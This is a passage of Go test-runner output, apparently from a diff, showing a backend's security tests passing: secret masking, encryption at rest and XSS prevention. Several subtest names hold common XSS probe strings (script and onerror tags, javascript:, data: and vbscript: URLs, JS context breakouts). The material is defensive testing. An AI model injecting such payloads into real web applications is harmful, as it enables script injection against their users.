+=== RUN   TestSensitiveDataMasking/Validation_errors_don't_leak_sensitive_data
+--- PASS: TestSensitiveDataMasking (0.00s)
+    --- PASS: TestSensitiveDataMasking/Database_connection_errors_mask_credentials (0.00s)
+    --- PASS: TestSensitiveDataMasking/JWT_errors_don't_expose_token (0.00s)
+    --- PASS: TestSensitiveDataMasking/Validation_errors_don't_leak_sensitive_data (0.00s)
+=== RUN   TestJWTSecretSafety
+=== RUN   TestJWTSecretSafety/JWT_secret_not_in_environment_dump
+=== RUN   TestJWTSecretSafety/JWT_secret_minimum_length_enforced
+--- PASS: TestJWTSecretSafety (0.00s)
+    --- PASS: TestJWTSecretSafety/JWT_secret_not_in_environment_dump (0.00s)
+    --- PASS: TestJWTSecretSafety/JWT_secret_minimum_length_enforced (0.00s)
+=== RUN   TestEncryptionAtRest
+=== RUN   TestEncryptionAtRest/OAuth_tokens_encrypted_in_database
+=== RUN   TestEncryptionAtRest/API_keys_encrypted_in_database
+=== RUN   TestEncryptionAtRest/Encryption_key_rotation_supported
+--- PASS: TestEncryptionAtRest (0.00s)
+    --- PASS: TestEncryptionAtRest/OAuth_tokens_encrypted_in_database (0.00s)
+    --- PASS: TestEncryptionAtRest/API_keys_encrypted_in_database (0.00s)
+    --- PASS: TestEncryptionAtRest/Encryption_key_rotation_supported (0.00s)
+=== RUN   TestLoggingSecurityHeaders
+=== RUN   TestLoggingSecurityHeaders/Authorization_header_masked_in_logs
+=== RUN   TestLoggingSecurityHeaders/Cookie_header_masked_in_logs
+--- PASS: TestLoggingSecurityHeaders (0.00s)
+    --- PASS: TestLoggingSecurityHeaders/Authorization_header_masked_in_logs (0.00s)
+    --- PASS: TestLoggingSecurityHeaders/Cookie_header_masked_in_logs (0.00s)
+=== RUN   TestSlogLogging
+=== RUN   TestSlogLogging/Use_slog_instead_of_fmt.Printf
+{"time":"2026-01-27T10:20:46.0095724-03:00","level":"INFO","msg":"test message","user_id":"user-123","action":"login"}
+=== RUN   TestSlogLogging/Sensitive_data_masked_in_slog
+{"time":"2026-01-27T10:20:46.0218514-03:00","level":"INFO","msg":"API call","token":"Bear***7890"}
+--- PASS: TestSlogLogging (0.01s)
+    --- PASS: TestSlogLogging/Use_slog_instead_of_fmt.Printf (0.01s)
+    --- PASS: TestSlogLogging/Sensitive_data_masked_in_slog (0.00s)
+=== RUN   TestMemoryLeaks
+=== RUN   TestMemoryLeaks/Clear_password_from_memory_after_hashing
+--- PASS: TestMemoryLeaks (0.21s)
+    --- PASS: TestMemoryLeaks/Clear_password_from_memory_after_hashing (0.21s)
+=== RUN   TestReflectedXSSPrevention
+=== RUN   TestReflectedXSSPrevention/XSS_<script>alert('XSS')</script>
+=== RUN   TestReflectedXSSPrevention/XSS_<img_src=x_onerror=alert('XSS'
+=== RUN   TestReflectedXSSPrevention/XSS_javascript:alert('XSS')
+=== RUN   TestReflectedXSSPrevention/XSS_<svg_onload=alert('XSS')>
+=== RUN   TestReflectedXSSPrevention/XSS_<body_onload=alert('XSS')>
+=== RUN   TestReflectedXSSPrevention/XSS_<iframe_src='javascript:alert(
+=== RUN   TestReflectedXSSPrevention/XSS_<input_onfocus=alert('XSS')_au
+=== RUN   TestReflectedXSSPrevention/XSS_<select_onfocus=alert('XSS')_a
+=== RUN   TestReflectedXSSPrevention/XSS_<textarea_onfocus=alert('XSS')
+=== RUN   TestReflectedXSSPrevention/XSS_<marquee_onstart=alert('XSS')>
+=== RUN   TestReflectedXSSPrevention/XSS_<details_open_ontoggle=alert('
+--- PASS: TestReflectedXSSPrevention (0.00s)
+    --- PASS: TestReflectedXSSPrevention/XSS_<script>alert('XSS')</script> (0.00s)
+    --- PASS: TestReflectedXSSPrevention/XSS_<img_src=x_onerror=alert('XSS' (0.00s)
+    --- PASS: TestReflectedXSSPrevention/XSS_javascript:alert('XSS') (0.00s)
+    --- PASS: TestReflectedXSSPrevention/XSS_<svg_onload=alert('XSS')> (0.00s)
+    --- PASS: TestReflectedXSSPrevention/XSS_<body_onload=alert('XSS')> (0.00s)
+    --- PASS: TestReflectedXSSPrevention/XSS_<iframe_src='javascript:alert( (0.00s)
+    --- PASS: TestReflectedXSSPrevention/XSS_<input_onfocus=alert('XSS')_au (0.00s)
+    --- PASS: TestReflectedXSSPrevention/XSS_<select_onfocus=alert('XSS')_a (0.00s)
+    --- PASS: TestReflectedXSSPrevention/XSS_<textarea_onfocus=alert('XSS') (0.00s)
+    --- PASS: TestReflectedXSSPrevention/XSS_<marquee_onstart=alert('XSS')> (0.00s)
+    --- PASS: TestReflectedXSSPrevention/XSS_<details_open_ontoggle=alert(' (0.00s)
+=== RUN   TestStoredXSSPrevention
+=== RUN   TestStoredXSSPrevention/username_User_profile
+=== RUN   TestStoredXSSPrevention/message_Chat_message
+=== RUN   TestStoredXSSPrevention/description_Project_description
+=== RUN   TestStoredXSSPrevention/name_Workspace_name
+=== RUN   TestStoredXSSPrevention/bio_User_bio
+--- PASS: TestStoredXSSPrevention (0.00s)
+    --- PASS: TestStoredXSSPrevention/username_User_profile (0.00s)
+    --- PASS: TestStoredXSSPrevention/message_Chat_message (0.00s)
+    --- PASS: TestStoredXSSPrevention/description_Project_description (0.00s)
+    --- PASS: TestStoredXSSPrevention/name_Workspace_name (0.00s)
+    --- PASS: TestStoredXSSPrevention/bio_User_bio (0.00s)
+=== RUN   TestDOMBasedXSSPrevention
+=== RUN   TestDOMBasedXSSPrevention/URL_fragment_XSS
+=== RUN   TestDOMBasedXSSPrevention/innerHTML_usage_prevention
+--- PASS: TestDOMBasedXSSPrevention (0.00s)
+    --- PASS: TestDOMBasedXSSPrevention/URL_fragment_XSS (0.00s)
+    --- PASS: TestDOMBasedXSSPrevention/innerHTML_usage_prevention (0.00s)
+=== RUN   TestContentSecurityPolicy
+=== RUN   TestContentSecurityPolicy/CSP_header_blocks_inline_scripts
+=== RUN   TestContentSecurityPolicy/CSP_nonce_for_inline_scripts
+--- PASS: TestContentSecurityPolicy (0.00s)
+    --- PASS: TestContentSecurityPolicy/CSP_header_blocks_inline_scripts (0.00s)
+    --- PASS: TestContentSecurityPolicy/CSP_nonce_for_inline_scripts (0.00s)
+=== RUN   TestHTMLEntityEncoding
+=== RUN   TestHTMLEntityEncoding/Encode_<script>
+=== RUN   TestHTMLEntityEncoding/Encode_'alert(1)'
+=== RUN   TestHTMLEntityEncoding/Encode_"onclick"
+=== RUN   TestHTMLEntityEncoding/Encode_&
+=== RUN   TestHTMLEntityEncoding/Encode_<>&"'
+--- PASS: TestHTMLEntityEncoding (0.00s)
+    --- PASS: TestHTMLEntityEncoding/Encode_<script> (0.00s)
+    --- PASS: TestHTMLEntityEncoding/Encode_'alert(1)' (0.00s)
+    --- PASS: TestHTMLEntityEncoding/Encode_"onclick" (0.00s)
+    --- PASS: TestHTMLEntityEncoding/Encode_& (0.00s)
+    --- PASS: TestHTMLEntityEncoding/Encode_<>&"' (0.00s)
+=== RUN   TestJavaScriptContextEscaping
+=== RUN   TestJavaScriptContextEscaping/JS_Context_</script><script>ale
+=== RUN   TestJavaScriptContextEscaping/JS_Context_';alert(1);//
+=== RUN   TestJavaScriptContextEscaping/JS_Context_";alert(1);//
+=== RUN   TestJavaScriptContextEscaping/JS_Context_\';alert(1);//
+--- PASS: TestJavaScriptContextEscaping (0.00s)
+    --- PASS: TestJavaScriptContextEscaping/JS_Context_</script><script>ale (0.00s)
+    --- PASS: TestJavaScriptContextEscaping/JS_Context_';alert(1);// (0.00s)
+    --- PASS: TestJavaScriptContextEscaping/JS_Context_";alert(1);// (0.00s)
+    --- PASS: TestJavaScriptContextEscaping/JS_Context_\';alert(1);// (0.00s)
+=== RUN   TestURLContextEncoding
+=== RUN   TestURLContextEncoding/URL_javascript:alert(1)
+=== RUN   TestURLContextEncoding/URL_data:text/html,<scri
+=== RUN   TestURLContextEncoding/URL_vbscript:msgbox(1)
+--- PASS: TestURLContextEncoding (0.00s)
+    --- PASS: TestURLContextEncoding/URL_javascript:alert(1) (0.00s)
+    --- PASS: TestURLContextEncoding/URL_data:text/html,<scri (0.00s)
+    --- PASS: TestURLContextEncoding/URL_vbscript:msgbox(1) (0.00s)
+=== RUN   TestXSSInHTTPHeaders
+=== RUN   TestXSSInHTTPHeaders/X-Content-Type-Options_header
+=== RUN   TestXSSInHTTPHeaders/X-Frame-Options_header
+--- PASS: TestXSSInHTTPHeaders (0.00s)
+    --- PASS: TestXSSInHTTPHeaders/X-Content-Type-Options_header (0.00s)
+    --- PASS: TestXSSInHTTPHeaders/X-Frame-Options_header (0.00s)
+PASS
+ok  	github.com/rhl/businessos-backend/tests/security	(cached)
+FAIL
